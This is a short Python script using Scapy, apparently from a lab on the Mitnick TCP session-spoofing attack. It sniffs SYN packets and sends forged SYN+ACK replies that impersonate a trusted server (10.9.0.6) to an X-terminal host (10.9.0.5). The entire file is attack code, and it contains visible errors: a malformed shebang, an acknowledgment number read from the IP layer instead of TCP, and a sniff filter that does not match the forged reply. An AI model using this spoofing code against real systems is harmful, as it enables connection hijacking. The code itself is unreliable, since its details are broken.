#!usr/bin/python3
from scapy.all import *
import sys

X_ter_IP = "10.9.0.5"
X_ter_port = 1023
T_ser_IP = "10.9.0.6"
T_ser_port = 9090

def spoof_pkt(pkt):
	sequence = 378933595
	old_ip = pkt[IP]
	old_tcp = pkt[TCP]

	if old_tcp.flags == "S":
		print("Sending Spoofed SYN+ACK Packet ...")
		IP_layer = IP(src=T_ser_IP, dst=X_ter_IP)
		TCP_layer = TCP(sport=T_ser_port,dport=X_ter_port,flags="SA",
		 seq=sequence, ack= old_ip.seq + 1)
		pkt = IP_layer/TCP_layer
		send(pkt,verbose=0)

pkt = sniff(filter="tcp and dst host 10.9.0.5 and dst port 9090", prn=spoof_pkt)
